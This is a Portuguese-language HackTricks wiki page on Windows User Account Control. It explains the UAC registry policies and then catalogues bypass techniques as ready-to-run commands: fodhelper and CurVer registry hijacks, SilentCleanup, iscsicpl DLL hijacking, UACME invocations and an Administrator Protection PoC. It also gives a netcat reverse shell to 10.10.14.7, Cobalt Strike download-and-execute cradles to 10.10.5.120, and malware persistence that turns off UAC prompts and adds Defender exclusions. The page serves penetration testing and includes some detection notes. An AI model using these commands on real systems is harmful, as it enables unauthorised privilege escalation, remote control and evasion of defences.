# UAC - Controle de Conta de Usuário

{{#include ../../banners/hacktricks-training.md}}

## UAC

O [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita um **prompt de consentimento para atividades elevadas**. Os aplicativos têm diferentes níveis de `integrity`, e um programa com **nível alto** pode executar tarefas que **poderiam potencialmente comprometer o sistema**. Quando o UAC está habilitado, aplicativos e tarefas sempre **são executados no contexto de segurança de uma conta não administradora**, a menos que um administrador autorize explicitamente esses aplicativos/tarefas a terem acesso de nível administrativo ao sistema para serem executados. É um recurso de conveniência que protege os administradores contra alterações não intencionais, mas não é considerado um limite de segurança.<sup>[[2]](#references)</sup>

Para mais informações sobre níveis de integridade:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: um token de usuário padrão, para executar ações regulares com integridade média, e outro com os privilégios administrativos.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute detalhadamente como o UAC funciona e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC.<sup>[[2]](#references)</sup> Os administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização no nível local (usando secpol.msc), ou configurá-lo e distribuí-lo por meio de Group Policy Objects (GPO) em um ambiente de domínio do Active Directory. As várias configurações são discutidas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Há 10 configurações de Group Policy que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Configuração de Group Policy                                                                                                                                                                                                                                                                                                                                                           | Chave do Registro                | Configuração Padrão                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Desabilitado)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Solicitar consentimento para binários que não sejam do Windows na área de trabalho segura) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Solicitar credenciais na área de trabalho segura)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Habilitado; desabilitado por padrão no Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Desabilitado)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Habilitado)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Habilitado)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Desabilitado)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Habilitado)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Habilitado)                                              |

### Políticas para instalar software no Windows

As **políticas de segurança locais** ("secpol.msc" na maioria dos sistemas) são configuradas por padrão para **impedir que usuários não administradores realizem instalações de software**. Isso significa que, mesmo que um usuário não administrador consiga baixar o instalador do seu software, ele não poderá executá-lo sem uma conta de administrador.

### Chaves do Registro para forçar o UAC a solicitar elevação

Como usuário padrão sem direitos administrativos, você pode garantir que a conta "padrão" seja **solicitada a fornecer credenciais pelo UAC** ao tentar executar determinadas ações. Essa ação exigiria modificar determinadas **chaves do registro**, para as quais você precisa de permissões administrativas, a menos que exista um **UAC bypass**, ou que o atacante já esteja conectado como administrador.

Mesmo que o usuário esteja no grupo **Administrators**, essas alterações forçam o usuário a **inserir novamente as credenciais da conta** para executar ações administrativas.

**Na prática, isso só é útil quando você já possui um token elevado, um UAC bypass ou uma configuração incorreta que permita alterar essas chaves; caso contrário, a própria gravação no registro será bloqueada.**

As chaves e entradas do registro que você deve alterar são as seguintes (com seus valores padrão entre parênteses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Isso também pode ser feito manualmente por meio da ferramenta Local Security Policy. Depois de alteradas, as operações administrativas solicitam que o usuário insira novamente suas credenciais.

### Observação

**O User Account Control não é um limite de segurança.** Portanto, usuários padrão não podem escapar de suas contas e obter direitos de administrador sem um exploit de escalada de privilégios local.

### Solicitar 'acesso total ao computador' a um usuário
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- O Internet Explorer Protected Mode usa verificações de integridade para impedir que processos com nível de integridade alto (como navegadores da web) acessem dados com nível de integridade baixo (como a pasta de arquivos temporários da Internet). Isso é feito executando o navegador com um token de baixa integridade. Quando o navegador tenta acessar dados armazenados na zona de baixa integridade, o sistema operacional verifica o nível de integridade do processo e permite o acesso de acordo com ele. Esse recurso ajuda a impedir que ataques de execução remota de código obtenham acesso a dados sensíveis no sistema.
- Quando um usuário faz logon no Windows, o sistema cria um token de acesso que contém uma lista dos privilégios do usuário. Os privilégios são definidos como a combinação dos direitos e das capacidades de um usuário. O token também contém uma lista das credenciais do usuário, usadas para autenticá-lo no computador e nos recursos da rede.

### Autoadminlogon

Para configurar o Windows para fazer logon automaticamente com um usuário específico na inicialização, defina a **chave de registro `AutoAdminLogon`**. Isso é útil em ambientes de quiosque ou para fins de teste. Use isso apenas em sistemas seguros, pois a senha fica exposta no registro.

Defina as seguintes chaves usando o Editor do Registro ou `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para retornar ao comportamento normal de logon, defina `AutoAdminLogon` como 0.

## UAC bypass

> [!TIP]
> Observe que, se você tiver acesso gráfico ao alvo, o UAC bypass é simples, pois basta clicar em "Yes" quando o prompt do UAC aparecer

O UAC bypass é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil fazer o bypass do UAC quando ele está no nível de segurança mais alto (Always) do que quando está em qualquer um dos outros níveis (Default).**

### Fast triage from a medium-integrity shell

Antes de tentar um bypass, confirme se você está no cenário correto e associe o build do host aos métodos conhecidos que funcionam:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notas práticas:
- Se `EnableLUA=0`, você não precisa de um bypass: qualquer token de administrador pode solicitar diretamente alta integridade.
- `ConsentPromptBehaviorAdmin=2` ou `5` é o cenário comum para bypasses de autoelevação / baseados em COM.
- `Always Notify` aumenta a dificuldade, mas você ainda deve testar a build exata em vez de presumir uma falha: o UACME ainda acompanha alguns métodos `AlwaysNotify compatible` em builds modernas do Windows.<sup>[[3]](#references)</sup>

### UAC desabilitado

Se o UAC já estiver desabilitado (`ConsentPromptBehaviorAdmin` for **`0`**), você pode **executar um reverse shell com privilégios de administrador** (nível de alta integridade) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass com duplicação de token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** Basic UAC "bypass" (acesso completo ao sistema de arquivos)

Se você tiver um shell com um usuário que esteja dentro do grupo Administrators, poderá **montar o compartilhamento C$** via SMB (sistema de arquivos) localmente como um novo disco e terá **acesso a tudo dentro do sistema de arquivos** (até mesmo à pasta inicial do Administrator).

> [!WARNING]
> **Parece que este truque não está mais funcionando**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass com cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no nível máximo de segurança
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também têm vários módulos para **bypass** do **UAC**.

### Interfaces COM elevadas (`ICMLuaUtil` / `CMSTPLUA`)

Objetos COM autoelevados continuam sendo uma superfície prática do UAC em builds modernos. O `ICMLuaUtil` ainda é rastreado pelo UACME como funcional nas branches atuais do Windows, e as ferramentas ofensivas continuam adaptando o `CMSTPLUA` combinando um processo na área de trabalho interativa, execução de 64 bits e, às vezes, masquerading do PEB/processo antes de invocar o COM Elevation Moniker.<sup>[[3]](#references)</sup>

Dicas práticas:
- Prefira um processo de **64 bits** na **sessão interativa** do usuário (comumente `explorer.exe` ou um processo filho dele).
- Se um shell bruto falhar, tente novamente a partir de um BOF / implementação do UACME em vez de um wrapper ingênuo de `CreateProcess`.
- Espere que a execução do processo filho ocorra em um **processo elevado separado**; muitos BOFs não elevam o beacon atual in-place.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass do UAC

[**UACME**](https://github.com/hfiref0x/UACME) é uma coleção de técnicas de bypass do UAC. Compile-o com Visual Studio ou MSBuild; o build cria vários executáveis (por exemplo, `Source\Akagi\output\x64\Debug\Akagi.exe`), então selecione o método apropriado para o build-alvo.<sup>[[3]](#references)</sup>\
Tenha cuidado: alguns bypasses iniciam programas visíveis ou prompts que podem alertar o usuário.<sup>[[3]](#references)</sup>

O UACME contém a **versão do build a partir da qual cada técnica começou a funcionar**.<sup>[[3]](#references)</sup> Você pode pesquisar uma técnica que afete suas versões:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página, você obtém a versão do Windows `1607` a partir das versões de build.

Um fluxo prático é primeiro **avaliar a build do host** e só então executar o método correspondente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compara rapidamente a build local com os métodos de UAC conhecidos, o que é útil para descartar PoCs inativos rapidamente.<sup>[[4]](#references)</sup>
- `UACME` continua sendo o melhor catálogo público para mapear um bypass a uma build específica. A versão 3.7.1 adicionou os métodos 83–85, enquanto a versão anterior testou novamente os métodos existentes contra o **Windows 11 25H2**; verifique novamente a tabela de métodos e as notas de release em vez de presumir que uma PoC antiga ainda se aplica sem alterações.<sup>[[3]](#references)[[9]](#references)</sup>

### Chains WNF/UIAccess compatíveis com Always Notify (UACME 3.7.1)

`Always Notify` não elimina todos os UAC bypasses. O UACME 3.7.1 implementa três novos métodos x64 que combinam estado de ambiente/protocolo controlado pelo usuário com comportamento de tarefa agendada elevada ou UIAccess, e marca todos como `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** redirecione `SystemRoot` para que a `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` acionada por WNF faça o `taskhostw.exe` elevado executar o side-load de `unifiedconsent.dll`. O UACME o rastreia a partir da build 19041 do Windows 10.
- **84 — TabTip:** use a mesma primitiva de variável de ambiente contra o `TabTip.exe` com UIAccess, que carrega `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ou `rsaenh.dll`, dependendo da build; em seguida, faça pivot a partir do contexto UIAccess de alta integridade resultante. O UACME o rastreia a partir do Windows 8.1 / Server 2016.
- **85 — Narrator:** sequestre o protocolo `feedback-hub` por usuário, controle o Narrator com `Alt+CapsLock+F` e execute uma cópia gravável do `osk.exe` que faz o side-load de `OskSupport.dll`. Isso requer um desktop interativo e é rastreado a partir do Windows 10 1809 / Server 2019.

Depois de compilar as payload units e o Akagi conforme documentado pelo UACME, invoque o número do método correspondente (o comando opcional usa `cmd.exe` por padrão):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Os Métodos 84 e 85 dependem de UIAccess/interação com a área de trabalho; portanto, não espere que funcionem sem alterações a partir da Session 0 ou de um shell de serviço não interativo. Os três manipulam o estado do ambiente/protocolo e preparam DLLs; inspecione a implementação e remova esses artefatos após os testes.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é autoelevado nas versões modernas do Windows. Quando iniciado, ele consulta o caminho do Registry por usuário abaixo sem validar o verbo `DelegateExecute`. Inserir um comando nesse local permite que um processo de Medium Integrity (o usuário está no grupo Administrators) crie um processo de High Integrity sem um aviso do UAC.

Caminho do Registry consultado pelo fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Etapas do PowerShell (defina seu payload e, em seguida, acione)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona quando o usuário atual é membro de Administrators e o nível do UAC é padrão/flexível (não Always Notify com restrições adicionais).
- Use o caminho `sysnative` para iniciar um PowerShell de 64 bits a partir de um processo de 32 bits no Windows de 64 bits.
- O Payload pode ser qualquer comando (PowerShell, cmd ou um caminho para um EXE). Evite UIs que solicitem interação para manter o stealth.

#### Variante de hijack de CurVer/extensão (somente HKCU)

Amostras recentes que abusam do `fodhelper.exe` evitam `DelegateExecute` e, em vez disso, **redirecionam o ProgID `ms-settings`** por meio do valor `CurVer` específico do usuário. O binário auto-elevado ainda resolve o handler em `HKCU`, portanto nenhum token de administrador é necessário para criar as chaves:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Depois de obter privilégios elevados, o malware geralmente **desativa prompts futuros** definindo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` como `0`, depois realiza evasão adicional de defesas (por exemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) e recria a persistência para ser executado com alta integridade. Uma tarefa de persistência típica armazena um **script PowerShell criptografado com XOR** no disco e o decodifica/executa na memória a cada hora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante ainda limpa o **dropper** e deixa apenas os payloads staged, fazendo com que a detecção dependa do monitoramento do **`CurVer` hijack**, da adulteração de `ConsentPromptBehaviorAdmin`, da criação de exclusões no Defender ou de tarefas agendadas que descriptografam o PowerShell na memória.<sup>[[5]](#references)</sup>

### Bypass de UAC via tarefa `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` inicia `cleanmgr.exe` com privilégios máximos e expande `%windir%` a partir do ambiente do usuário. Se você controlar `HKCU\Environment\windir`, poderá redirecionar essa expansão para um comando arbitrário e obter alta integridade sem uma caixa de diálogo de consentimento.<sup>[[8]](#references)</sup> Ainda vale a pena testar esse método em builds recentes, pois o UACME mantém a técnica ativa, e o rastreamento de problemas recentes indica que o Windows 11 24H2 pode exigir apenas pequenos ajustes nas aspas.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Se a tarefa citar o caminho nessa build, tente novamente usando o payload terminado em aspas (por exemplo, `cmd.exe"`). Sempre limpe `HKCU\Environment\windir` após os testes.

#### Mais UAC bypass

Muitos UAC bypass clássicos que abusam de fluxos de UI, objetos COM ou interação com o desktop exigem uma **sessão interativa completa** com a vítima; um shell comum com `nc.exe` ou um serviço em execução na **Session 0** geralmente não é suficiente.

Você pode frequentemente resolver isso usando uma sessão **meterpreter**. Migre para um **processo** que tenha o valor de **Session** igual a **1**:

![Aponte ms-settings para uma extensão personalizada (.thm) e associe essa extensão ao nosso payload - Mais UAC bypass: Você pode fazer isso usando uma sessão meterpreter. Migre para um processo que tenha o valor de Session...](<../../images/image (863).png>)

(_explorer.exe_ deve funcionar)

### UAC Bypass com GUI

Se você tiver acesso a uma **GUI**, basta aceitar o prompt do UAC quando ele aparecer; você realmente não precisa de um bypass técnico. Portanto, obter uma sessão GUI geralmente é suficiente para contornar o atrito prático adicionado pelo UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), haverá **algumas ferramentas em execução como administrador**, a partir das quais você poderá **executar** um **cmd**, por exemplo **como administrador**, diretamente, sem receber novamente um prompt do UAC, como em [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### UAC bypass por brute-force ruidoso

Se o ruído for aceitável, uma ferramenta como [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) pode solicitar elevação repetidamente até que o usuário a aceite.

### Seu próprio bypass - Metodologia básica de UAC bypass

Se você observar o **UACME**, notará que **muitos UAC bypass abusam de DLL hijacking** (frequentemente fazendo com que um binário elevado carregue uma DLL controlada pelo atacante a partir de um caminho gravável). [Leia isto para aprender a encontrar uma vulnerabilidade de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binário que faça **autoelevate** (verifique se, quando executado, ele é executado em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que possam ser vulneráveis a **DLL Hijacking**.
3. Provavelmente, você precisará **escrever** a DLL dentro de alguns **caminhos protegidos** (como C:\Windows\System32), nos quais você não tem permissões de escrita. Você pode contornar isso usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Ele permite extrair o conteúdo de um arquivo CAB dentro de caminhos protegidos (porque essa ferramenta é executada a partir de um nível de integridade alto).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL para dentro do caminho protegido e executar o binário vulnerável e autoelevated.

### Outra técnica de UAC bypass

Consiste em observar se um **binário autoElevated** tenta **ler** do **registro** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário procurar essas informações dentro de **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + DLL hijack usando o `PATH` do usuário

O `C:\Windows\SysWOW64\iscsicpl.exe` de 32 bits é um binário **auto-elevated** que pode ser abusado para carregar `iscsiexe.dll` pela ordem de pesquisa. Se você puder colocar uma `iscsiexe.dll` maliciosa dentro de uma pasta **gravável pelo usuário** e depois modificar o `PATH` do usuário atual (por exemplo, via `HKCU\Environment\Path`) para que essa pasta seja pesquisada, o Windows poderá carregar a DLL do atacante dentro do processo elevado `iscsicpl.exe` **sem exibir um prompt do UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Notas práticas:
- Isso é útil quando o usuário atual está no grupo **Administrators**, mas executando com **Medium Integrity** devido ao UAC.
- A cópia em **SysWOW64** é a relevante para este bypass. Trate a cópia em **System32** como um binário separado e valide o comportamento de forma independente.
- A primitiva é uma combinação de **auto-elevation** e **DLL search-order hijacking**, portanto o mesmo fluxo de trabalho do ProcMon usado para outros UAC bypass é útil para validar o carregamento da DLL ausente.

Fluxo mínimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideias de detecção:
- Gere um alerta para `reg add` / gravações no registro em `HKCU\Environment\Path` imediatamente seguidas pela execução de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Procure por `iscsiexe.dll` em locais **controlados pelo usuário**, como `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacione inicializações de `iscsicpl.exe` com processos filho inesperados ou carregamentos de DLL a partir de diretórios fora dos diretórios normais do Windows.

### Pesquisas mais recentes que vale a pena verificar separadamente

Algumas cadeias posteriores a 2024 já não se parecem com os clássicos registry hijacks de `HKCU\Software\Classes`. Por exemplo, o activation-context cache poisoning pode encadear um **drive remap** e um **DLL redirection** para passar de integridade média para alta por meio de trusted UI / binários auto-elevated, como `ctfmon.exe`, e posteriormente alvos como `fodhelper.exe`. Em vez de duplicar o grande PoC aqui, consulte os exemplos compactos de payload em:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack de drive-letter do Administrator Protection (preview) via per-logon-session DOS device map

> [!NOTE]
> Em agosto de 2026, a Microsoft ainda documenta o Administrator Protection como um **Insider preview**: o rollout de outubro de 2025 foi revertido e está planejado para uma data posterior. Confirme se **Admin Approval Mode with Administrator protection** está realmente habilitado e se o dispositivo foi reinicializado antes de testar essas cadeias; apenas uma string de versão padrão 25H2 não comprova que o recurso está ativo.<sup>[[10]](#references)</sup>

Para consultar toda a superfície de ataque de `RAiLaunchAdminProcess` / UIAccess em preview builds do Windows 11 25H2, consulte a página dedicada:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

O Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens com mapas `\Sessions\0\DosDevices/<LUID>` por sessão. O diretório é criado de forma lazy por `SeGetTokenDeviceMap` na primeira resolução de `\??`. Se o atacante impersonar o shadow-admin token apenas em **SecurityIdentification**, o diretório será criado com o atacante como **owner** (herdando `CREATOR OWNER`), permitindo drive-letter links que têm precedência sobre `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Etapas:**

1. A partir de uma sessão com privilégios baixos, chame `RAiProcessRunOnce` para iniciar um `runonce.exe` shadow-admin sem prompt.
2. Duplique o primary token para um token de **identification** e faça impersonation dele enquanto abre `\??` para forçar a criação de `\Sessions\0\DosDevices/<LUID>` sob a ownership do atacante.
3. Crie um symlink `C:` nesse local apontando para um storage controlado pelo atacante; os acessos subsequentes ao filesystem nessa sessão resolverão `C:` para o caminho do atacante, permitindo DLL/file hijack sem um prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Em hosts de preview, o Administrator Protection registra aprovações e falhas como eventos ETW **15031** e **15032** no provider `Microsoft-Windows-LUA`. Os eventos incluem o SID do solicitante, o caminho do aplicativo, o resultado, a conta de administrador gerenciada e o método de autenticação; portanto, tentativas repetidas de exploração ou automação malsucedida da UI não ficam sem telemetria.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Como funciona o User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Coleção de técnicas de bypass de UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilidade e launcher de bypass de UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adota IA para gerar backdoors em PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operação TrueChaos: Exploração de 0-Day contra alvos governamentais do Sudeste Asiático](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass da proteção de administradores do Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass de UAC usando a tarefa SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
